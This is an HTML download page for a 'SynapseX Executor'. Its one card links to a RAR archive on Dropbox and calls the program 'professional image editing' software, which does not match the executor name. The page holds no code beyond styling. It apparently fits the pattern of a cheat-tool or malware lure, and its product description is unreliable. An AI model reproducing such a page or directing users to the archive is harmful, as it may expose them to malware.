<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Program Download Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
        
        :root {
            --bg-color: #0d0e10;
            --card-bg-color: rgba(20, 25, 30, 0.6);
            --text-color: #e8e8e8;
            --accent-color: #3B82F6; /* Blue accent for a fresh look */
            --accent-dark-color: #2563EB;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            background: radial-gradient(circle at 10% 20%, rgba(59, 130, 246, 0.1) 0%, rgba(0,0,0,0) 70%),
                        radial-gradient(circle at 90% 80%, rgba(59, 130, 246, 0.1) 0%, rgba(0,0,0,0) 70%),
                        linear-gradient(135deg, #101214 0%, #0d0e10 100%);
            background-attachment: fixed;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 3rem 1rem;
        }

        .card {
            background-color: var(--card-bg-color);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(70, 70, 70, 0.4);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
            transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 0.5s ease;
        }

        .card:hover {
            transform: translateY(-15px) scale(1.03);
            border-color: var(--accent-color);
            box-shadow: 0 25px 60px rgba(59, 130, 246, 0.25);
        }

        .download-button {
            background: linear-gradient(45deg, var(--accent-color), #60A5FA);
            color: white;
            font-weight: 700;
            transition: background 0.4s ease, transform 0.3s ease, box-shadow 0.4s ease;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }

        .download-button:hover {
            background: linear-gradient(45deg, var(--accent-dark-color), #3B82F6);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.5);
        }

        .icon-container {
            width: 100px;
            height: 100px;
            background-color: rgba(59, 130, 246, 0.1);
            border-radius: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        
        .card:hover .icon-container {
            transform: scale(1.2) rotate(8deg);
        }

        .icon-container svg {
            width: 64px;
            height: 64px;
            color: var(--accent-color);
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-6">

    <div class="w-full max-w-5xl text-center mb-16">
        <h1 class="text-5xl md:text-6xl font-extrabold mb-4 tracking-tight text-white">SynapseX Executor</h1>
        <p class="text-xl md:text-2xl text-gray-300 font-light">The best Executor for you.</p>
    </div>

    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8 w-full max-w-6xl">

        <!-- Program Card 1: SynapseX V1.0.2 -->
        <div class="card rounded-2xl overflow-hidden p-10 flex flex-col items-center text-center">
            <div class="icon-container mb-8">
                <!-- Replace the SVG tag with an <img> tag for a custom image -->
                <img src="https://img.icons8.com/?size=100&id=7SFIa9M06ZCg&format=png&color=000000" alt="SynapseX Icon" class="w-16 h-16">
            </div>
            <h2 class="text-2xl font-semibold mb-2 text-white">SynapseX V1.0.2</h2>
            <p class="text-gray-400 text-sm mb-6 flex-grow">Professional image editing and management software with a full set of features.</p>
            <a href="https://www.dropbox.com/scl/fi/2ja0jw1eqg6j4h40gdloi/SynapseX-V1.0.2.rar?rlkey=oledcvlrx5hi1gvko945dskgv&st=ilswh5bd&dl=1" class="download-button w-full py-3 rounded-xl">Download</a>
        </div>

    </div>

</body>
</html>
